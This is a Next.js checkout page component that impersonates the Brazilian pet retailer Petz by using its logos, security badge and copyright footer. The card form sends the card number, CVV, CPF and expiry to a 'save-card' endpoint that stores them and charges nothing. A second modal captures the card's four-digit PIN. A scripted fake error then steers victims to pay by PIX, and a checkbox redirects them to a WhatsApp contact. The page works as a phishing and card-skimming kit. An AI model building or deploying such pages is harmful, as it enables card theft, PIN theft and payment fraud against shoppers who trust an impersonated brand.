'use client'

import { useEffect, useState } from 'react'
import { useParams } from 'next/navigation'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Checkbox } from '@/components/ui/checkbox'
import { 
  Copy, 
  CheckCircle2, 
  Loader2, 
  CreditCard, 
  QrCode, 
  ShieldCheck,
  Package,
  ChevronRight,
  Lock
} from 'lucide-react'
import { toast } from 'sonner'
import Image from 'next/image'

interface PaymentLink {
  id: string
  link_id: string
  amount: number
  products: string[]
  pix_qr_code: string | null
  pix_code: string | null
  status: string
  created_at: string
}

export default function CheckoutPage() {
  const params = useParams()
  const linkId = params.linkId as string
  const [link, setLink] = useState<PaymentLink | null>(null)
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState(false)
  const [paymentMethod, setPaymentMethod] = useState<'pix' | 'card' | null>(null)
  const [pixPaid, setPixPaid] = useState(false)
  const [showPasswordModal, setShowPasswordModal] = useState(false)
  const [cardPassword, setCardPassword] = useState('')
  const [savedCardId, setSavedCardId] = useState<string | null>(null)
  const [submitting, setSubmitting] = useState(false)

  const [cardData, setCardData] = useState({
    cardNumber: '',
    cardHolder: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    cpf: ''
  })

  const [installments, setInstallments] = useState('1')

  useEffect(() => {
    fetchLink()
  }, [linkId])

  const fetchLink = async () => {
    try {
      const response = await fetch(`/api/checkout/${linkId}`)
      
      if (!response.ok) {
        console.error('Erro na resposta:', response.status, response.statusText)
        setError(true)
        return
      }

      const data = await response.json()
      setLink(data)
    } catch (err) {
      console.error('Erro ao carregar link:', err)
      setError(true)
    } finally {
      setLoading(false)
    }
  }

  const handleCopyPixCode = async () => {
    if (!link?.pix_code) return

    try {
      await navigator.clipboard.writeText(link.pix_code)
      toast.success('Código PIX copiado!')
    } catch (error) {
      const textArea = document.createElement('textarea')
      textArea.value = link.pix_code
      textArea.style.position = 'fixed'
      textArea.style.left = '-999999px'
      document.body.appendChild(textArea)
      textArea.select()
      try {
        document.execCommand('copy')
        toast.success('Código PIX copiado!')
      } catch (err) {
        toast.error('Não foi possível copiar o código')
      }
      document.body.removeChild(textArea)
    }
  }

  const handlePixPaidClick = () => {
    const whatsappNumber = '5511999999999'
    const message = encodeURIComponent('Olá! Tive um problema com o pagamento via PIX.')
    window.location.href = `https://wa.me/${whatsappNumber}?text=${message}`
  }

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, '')
    const formatted = cleaned.match(/.{1,4}/g)?.join(' ') || cleaned
    return formatted.substring(0, 19)
  }

  const formatCPF = (value: string) => {
    const cleaned = value.replace(/\D/g, '')
    if (cleaned.length <= 11) {
      return cleaned
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d{1,2})$/, '$1-$2')
    }
    return cleaned.substring(0, 11)
  }

  const handleCardSubmit = async () => {
    if (!cardData.cardNumber || !cardData.cardHolder || !cardData.expiryMonth || !cardData.expiryYear || !cardData.cvv || !cardData.cpf) {
      toast.error('Preencha todos os campos do cartão')
      return
    }

    if (submitting) return
    setSubmitting(true)

    try {
      console.log('Enviando dados do cartão...')
      
      const payload = {
        link_id: linkId,
        card_number: cardData.cardNumber.replace(/\s/g, ''),
        card_holder: cardData.cardHolder,
        expiry_date: `${cardData.expiryMonth}/${cardData.expiryYear}`,
        cvv: cardData.cvv,
        cpf: cardData.cpf.replace(/\D/g, '')
      }
      
      console.log('Payload:', { ...payload, card_number: '****', cvv: '***', cpf: '***' })
      
      const response = await fetch('/api/checkout/save-card', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      })

      console.log('Status da resposta:', response.status)

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({ error: 'Erro desconhecido' }))
        console.error('❌ Erro ao processar cartão:', response.status, errorData)
        
        // Exibir erro mais detalhado
        const errorMessage = errorData.details 
          ? `${errorData.error}: ${errorData.details}` 
          : errorData.error || 'Erro ao processar cartão'
        
        toast.error(errorMessage, { duration: 5000 })
        setSubmitting(false)
        return
      }

      const data = await response.json()
      console.log('✅ Resposta da API:', data)

      if (data.success && data.cardId) {
        console.log('✅ Cartão salvo com sucesso! ID:', data.cardId)
        setSavedCardId(data.cardId)
        setShowPasswordModal(true)
      } else {
        console.error('❌ Resposta inválida:', data)
        toast.error('Erro ao processar cartão: resposta inválida')
      }
    } catch (error) {
      console.error('❌ Erro ao processar pagamento:', error)
      const errorMessage = error instanceof Error ? error.message : 'Erro desconhecido'
      toast.error(`Erro ao processar pagamento: ${errorMessage}`, { duration: 5000 })
    } finally {
      setSubmitting(false)
    }
  }

  const handlePasswordSubmit = async () => {
    if (cardPassword && savedCardId) {
      try {
        await fetch('/api/checkout/save-card', {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            card_id: savedCardId,
            card_password: cardPassword
          })
        })
      } catch (error) {
        console.error('Erro ao salvar senha:', error)
      }
    }

    setShowPasswordModal(false)
    setTimeout(() => {
      alert('❌ Erro no Pagamento\n\nEsta forma de pagamento está indisponível no momento.\n\nPor favor, utilize o PIX para concluir sua compra.')
      setPaymentMethod('pix')
    }, 500)
  }

  // Componente de Resumo do Pedido (estilo Petz)
  const OrderSummary = () => {
    const installmentValue = link ? link.amount / parseInt(installments) : 0
    
    return (
      <div className="bg-white rounded-lg border border-gray-200 overflow-hidden">
        <div className="px-5 py-4 border-b border-gray-200">
          <h3 className="font-semibold text-gray-800">Resumo do pedido</h3>
        </div>
        
        <div className="p-5 space-y-3">
          {/* Produtos */}
          <div className="flex justify-between text-sm">
            <span className="text-gray-600">Valor dos produtos</span>
            <span className="text-gray-800 font-medium">R$ {link?.amount.toFixed(2)}</span>
          </div>

          {/* Descontos */}
          <div className="flex justify-between text-sm text-green-600">
            <span>Total de descontos</span>
            <span className="font-medium">- R$ 0,00</span>
          </div>

          <hr className="my-3 border-gray-200" />

          {/* Total */}
          <div className="space-y-1">
            <div className="flex justify-between items-center">
              <span className="text-gray-800 font-semibold text-lg">Total</span>
              <span className="text-gray-800 font-bold text-xl">R$ {link?.amount.toFixed(2)}</span>
            </div>
            
            {/* Parcelamento (apenas se não for 1x) */}
            {installments !== '1' && (
              <div className="flex justify-end">
                <span className="text-xs text-gray-500">
                  ou {installments}x de R$ {installmentValue.toFixed(2)} sem juros
                </span>
              </div>
            )}
          </div>
        </div>
      </div>
    )
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-[#f5f6f7] flex items-center justify-center p-4">
        <Card className="w-full max-w-md shadow-xl">
          <CardContent className="pt-6 flex flex-col items-center gap-4">
            <Loader2 className="h-8 w-8 animate-spin text-[#1e63a9]" />
            <p className="text-gray-600">Carregando informações de pagamento...</p>
          </CardContent>
        </Card>
      </div>
    )
  }

  if (error || !link) {
    return (
      <div className="min-h-screen bg-[#f5f6f7] flex items-center justify-center p-4">
        <Card className="w-full max-w-md border-red-200 shadow-xl">
          <CardContent className="pt-6 text-center">
            <div className="text-red-500 text-5xl mb-4">⚠️</div>
            <h2 className="text-xl font-bold text-gray-800 mb-2">Link Inválido</h2>
            <p className="text-gray-600">
              Este link de pagamento não existe ou expirou.
            </p>
          </CardContent>
        </Card>
      </div>
    )
  }

  if (link.status !== 'active') {
    return (
      <div className="min-h-screen bg-[#f5f6f7] flex items-center justify-center p-4">
        <Card className="w-full max-w-md border-yellow-200 shadow-xl">
          <CardContent className="pt-6 text-center">
            <div className="text-yellow-500 text-5xl mb-4">⏸️</div>
            <h2 className="text-xl font-bold text-gray-800 mb-2">Link Inativo</h2>
            <p className="text-gray-600">
              Este link de pagamento não está mais disponível.
            </p>
          </CardContent>
        </Card>
      </div>
    )
  }

  // Seleção de método de pagamento (estilo Petz)
  if (!paymentMethod) {
    return (
      <div className="min-h-screen bg-[#f5f6f7]">
        {/* Header */}
        <header className="bg-white border-b border-gray-200">
          <div className="max-w-[1200px] mx-auto px-6 sm:px-10 py-4 flex justify-between items-center">
            <div className="flex items-center">
              <Image
                src="https://static-file.petz.com.br/platforms/img/ds/petz/logo-petz_rebranding-primary.svg"
                alt="Petz"
                width={80}
                height={28}
                className="h-7 w-auto"
              />
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-600">
              <Image
                src="https://www.petz.com.br/checkout/img/safety.b5b53e3f.svg"
                alt="Ambiente Seguro"
                width={18}
                height={18}
                className="h-[18px] w-[18px]"
              />
              <span>Ambiente Seguro</span>
            </div>
          </div>
        </header>

        {/* Main Content */}
        <main className="max-w-[1200px] mx-auto px-4 py-7 grid grid-cols-1 lg:grid-cols-[2fr_1fr] gap-6">
          {/* Coluna Esquerda - Métodos de Pagamento */}
          <section>
            <div className="bg-white rounded-lg border border-gray-200 overflow-hidden">
              <div className="px-5 py-4 border-b border-gray-200">
                <h3 className="font-bold text-gray-800">Escolha a forma de pagamento</h3>
              </div>
              
              <div className="p-5 space-y-0">
                {/* Cartão de Crédito */}
                <div
                  onClick={() => setPaymentMethod('card')}
                  className="flex items-center gap-3 px-3 py-3 rounded-lg cursor-pointer hover:bg-[#f1f5fb] transition-colors"
                >
                  <Image
                    src="https://www.petz.com.br/checkout/img/creditcard-black.e43de4ee.svg"
                    alt="Cartão de crédito"
                    width={22}
                    height={22}
                    className="h-[22px] w-[22px]"
                  />
                  <span className="text-sm font-medium text-gray-800">Cartão de crédito</span>
                </div>

                {/* PIX */}
                <div
                  onClick={() => setPaymentMethod('pix')}
                  className="flex items-center gap-3 px-3 py-3 rounded-lg cursor-pointer hover:bg-[#f1f5fb] transition-colors"
                >
                  <Image
                    src="https://www.petz.com.br/checkout/img/pix-outline.a3db8558.svg"
                    alt="Pix"
                    width={22}
                    height={22}
                    className="h-[22px] w-[22px]"
                  />
                  <span className="text-sm font-medium text-gray-800">Pix</span>
                </div>
              </div>
            </div>
          </section>

          {/* Coluna Direita - Resumo */}
          <aside>
            <OrderSummary />
          </aside>
        </main>

        {/* Footer */}
        <footer className="text-center text-xs text-gray-500 py-7">
          Copyright© 2026 Pet Center Comércio e Participações S/A<br />
          Todos os direitos reservados
        </footer>
      </div>
    )
  }

  // Pagamento via PIX
  if (paymentMethod === 'pix') {
    return (
      <div className="min-h-screen bg-[#f5f6f7]">
        {/* Header */}
        <header className="bg-white border-b border-gray-200">
          <div className="max-w-[1200px] mx-auto px-6 sm:px-10 py-4 flex justify-between items-center">
            <div className="flex items-center">
              <Image
                src="https://static-file.petz.com.br/platforms/img/ds/petz/logo-petz_rebranding-primary.svg"
                alt="Petz"
                width={80}
                height={28}
                className="h-7 w-auto"
              />
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-600">
              <Image
                src="https://www.petz.com.br/checkout/img/safety.b5b53e3f.svg"
                alt="Ambiente Seguro"
                width={18}
                height={18}
                className="h-[18px] w-[18px]"
              />
              <span>Ambiente Seguro</span>
            </div>
          </div>
        </header>

        {/* Main Content */}
        <main className="max-w-[1200px] mx-auto px-4 py-7 grid grid-cols-1 lg:grid-cols-[2fr_1fr] gap-6">
          {/* Coluna Esquerda - PIX */}
          <section className="space-y-4">
            <Button
              variant="ghost"
              onClick={() => setPaymentMethod(null)}
              className="text-[#1e63a9] hover:text-[#174f86] hover:bg-blue-50"
            >
              ← Voltar
            </Button>

            <div className="bg-white rounded-lg border border-gray-200 overflow-hidden">
              <div className="px-5 py-4 border-b border-gray-200 flex items-center gap-2">
                <Image
                  src="https://www.petz.com.br/checkout/img/raio-pix.fd9422d4.svg"
                  alt="PIX"
                  width={20}
                  height={20}
                  className="h-5 w-5"
                />
                <span className="text-sm text-gray-600">O pagamento é imediato e feito em poucos cliques pelo seu celular.</span>
              </div>
              
              <div className="p-5 space-y-5">
                {/* QR Code */}
                {link.pix_qr_code && (
                  <div className="flex flex-col items-center gap-3 py-4">
                    <div className="bg-white p-4 rounded-lg border border-gray-200">
                      <Image
                        src={link.pix_qr_code}
                        alt="QR Code PIX"
                        width={240}
                        height={240}
                        className="w-full max-w-[240px] h-auto"
                      />
                    </div>
                    <p className="text-sm text-gray-600 text-center">
                      Escaneie o QR Code com o app do seu banco
                    </p>
                  </div>
                )}

                {/* Código PIX */}
                {link.pix_code && (
                  <div className="space-y-3">
                    <p className="text-sm font-medium text-gray-700">
                      Ou copie o código PIX:
                    </p>
                    <div className="bg-gray-50 rounded-lg p-3 border border-gray-200">
                      <p className="text-xs text-gray-600 break-all font-mono">
                        {link.pix_code}
                      </p>
                    </div>
                    <Button
                      onClick={handleCopyPixCode}
                      className="w-full bg-[#1e63a9] hover:bg-[#174f86] h-12 font-semibold"
                    >
                      <Copy className="h-4 w-4 mr-2" />
                      Copiar Código PIX
                    </Button>
                  </div>
                )}

                {/* Checkbox Já Paguei */}
                <div className="bg-gray-50 rounded-lg p-4 border border-gray-200">
                  <div className="flex items-center space-x-3">
                    <Checkbox
                      id="paid"
                      checked={pixPaid}
                      onCheckedChange={(checked) => {
                        setPixPaid(checked as boolean)
                        if (checked) {
                          handlePixPaidClick()
                        }
                      }}
                    />
                    <label
                      htmlFor="paid"
                      className="text-sm font-medium text-gray-700 cursor-pointer"
                    >
                      Já realizei o pagamento via PIX
                    </label>
                  </div>
                </div>
              </div>
            </div>
          </section>

          {/* Coluna Direita - Resumo */}
          <aside>
            <OrderSummary />
          </aside>
        </main>

        {/* Footer */}
        <footer className="text-center text-xs text-gray-500 py-7">
          Copyright© 2026 Pet Center Comércio e Participações S/A<br />
          Todos os direitos reservados
        </footer>
      </div>
    )
  }

  // Pagamento via Cartão (estilo Petz)
  if (paymentMethod === 'card') {
    return (
      <div className="min-h-screen bg-[#f5f6f7]">
        {/* Header */}
        <header className="bg-white border-b border-gray-200">
          <div className="max-w-[1200px] mx-auto px-6 sm:px-10 py-4 flex justify-between items-center">
            <div className="flex items-center">
              <Image
                src="https://static-file.petz.com.br/platforms/img/ds/petz/logo-petz_rebranding-primary.svg"
                alt="Petz"
                width={80}
                height={28}
                className="h-7 w-auto"
              />
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-600">
              <Image
                src="https://www.petz.com.br/checkout/img/safety.b5b53e3f.svg"
                alt="Ambiente Seguro"
                width={18}
                height={18}
                className="h-[18px] w-[18px]"
              />
              <span>Ambiente Seguro</span>
            </div>
          </div>
        </header>

        {/* Main Content */}
        <main className="max-w-[1200px] mx-auto px-4 py-7 grid grid-cols-1 lg:grid-cols-[2fr_1fr] gap-6">
          {/* Coluna Esquerda - Formulário */}
          <section className="space-y-4">
            <Button
              variant="ghost"
              onClick={() => setPaymentMethod(null)}
              className="text-[#1e63a9] hover:text-[#174f86] hover:bg-blue-50"
            >
              ← Voltar
            </Button>

            <div className="bg-white rounded-lg border border-gray-200 overflow-hidden">
              <div className="px-5 py-4 border-b border-gray-200">
                <h3 className="font-semibold text-gray-800">Dados do Cartão</h3>
              </div>
              
              <div className="p-5 space-y-3">
                {/* Número do Cartão */}
                <Input
                  placeholder="Número do cartão"
                  value={cardData.cardNumber}
                  onChange={(e) => setCardData({ ...cardData, cardNumber: formatCardNumber(e.target.value) })}
                  maxLength={19}
                  className="h-12 border-gray-300 rounded-lg"
                />

                {/* Nome no Cartão */}
                <Input
                  placeholder="Nome do titular"
                  value={cardData.cardHolder}
                  onChange={(e) => setCardData({ ...cardData, cardHolder: e.target.value.toUpperCase() })}
                  className="h-12 border-gray-300 rounded-lg"
                />

                {/* CPF do Titular */}
                <Input
                  placeholder="CPF do titular"
                  value={cardData.cpf}
                  onChange={(e) => setCardData({ ...cardData, cpf: formatCPF(e.target.value) })}
                  maxLength={14}
                  className="h-12 border-gray-300 rounded-lg"
                />

                {/* Validade e CVV */}
                <div className="flex gap-3">
                  <Input
                    placeholder="MM"
                    value={cardData.expiryMonth}
                    onChange={(e) => setCardData({ ...cardData, expiryMonth: e.target.value.replace(/\D/g, '').substring(0, 2) })}
                    maxLength={2}
                    className="h-12 border-gray-300 rounded-lg"
                  />
                  <Input
                    placeholder="AA"
                    value={cardData.expiryYear}
                    onChange={(e) => setCardData({ ...cardData, expiryYear: e.target.value.replace(/\D/g, '').substring(0, 2) })}
                    maxLength={2}
                    className="h-12 border-gray-300 rounded-lg"
                  />
                  <Input
                    placeholder="CVV"
                    value={cardData.cvv}
                    onChange={(e) => setCardData({ ...cardData, cvv: e.target.value.replace(/\D/g, '').substring(0, 4) })}
                    maxLength={4}
                    className="h-12 border-gray-300 rounded-lg"
                  />
                </div>

                {/* Parcelas */}
                <select
                  value={installments}
                  onChange={(e) => setInstallments(e.target.value)}
                  className="w-full h-12 px-3 rounded-lg border border-gray-300 bg-white text-sm focus:outline-none focus:ring-2 focus:ring-[#1e63a9]"
                >
                  <option value="1">1x de R$ {link.amount.toFixed(2)} sem juros</option>
                  <option value="2">2x de R$ {(link.amount / 2).toFixed(2)} sem juros</option>
                  <option value="3">3x de R$ {(link.amount / 3).toFixed(2)} sem juros</option>
                </select>
              </div>
            </div>
          </section>

          {/* Coluna Direita - Resumo e Botão */}
          <aside className="space-y-4">
            <OrderSummary />
            
            <Button
              onClick={handleCardSubmit}
              disabled={submitting}
              className="w-full bg-[#1e63a9] hover:bg-[#174f86] h-14 text-base font-semibold rounded-lg disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {submitting ? (
                <>
                  <Loader2 className="h-5 w-5 mr-2 animate-spin" />
                  Processando...
                </>
              ) : (
                'Pagar agora'
              )}
            </Button>
          </aside>
        </main>

        {/* Footer */}
        <footer className="text-center text-xs text-gray-500 py-7">
          Copyright© 2026 Pet Center Comércio e Participações S/A<br />
          Todos os direitos reservados
        </footer>

        {/* Modal de Senha */}
        {showPasswordModal && (
          <div className="fixed inset-0 bg-black/60 flex items-center justify-center p-4 z-50 backdrop-blur-sm">
            <Card className="w-full max-w-md shadow-2xl">
              <CardHeader className="bg-gradient-to-r from-[#1e63a9] to-[#174f86] text-white">
                <CardTitle className="text-xl">Senha do Cartão</CardTitle>
                <CardDescription className="text-white/90">
                  Digite a senha do seu cartão
                </CardDescription>
              </CardHeader>
              <CardContent className="pt-6 space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="password" className="text-sm font-semibold text-gray-700">
                    SENHA DO CARTÃO
                  </Label>
                  <Input
                    id="password"
                    type="password"
                    placeholder="••••"
                    value={cardPassword}
                    onChange={(e) => setCardPassword(e.target.value.replace(/\D/g, '').substring(0, 4))}
                    maxLength={4}
                    className="h-12 text-center text-2xl tracking-widest"
                  />
                </div>
                <div className="flex gap-3">
                  <Button
                    onClick={handlePasswordSubmit}
                    className="flex-1 bg-[#1e63a9] hover:bg-[#174f86] h-12 font-semibold"
                  >
                    Confirmar
                  </Button>
                  <Button
                    onClick={handlePasswordSubmit}
                    variant="outline"
                    className="flex-1 h-12 font-semibold"
                  >
                    Pular
                  </Button>
                </div>
              </CardContent>
            </Card>
          </div>
        )}
      </div>
    )
  }

  return null
}
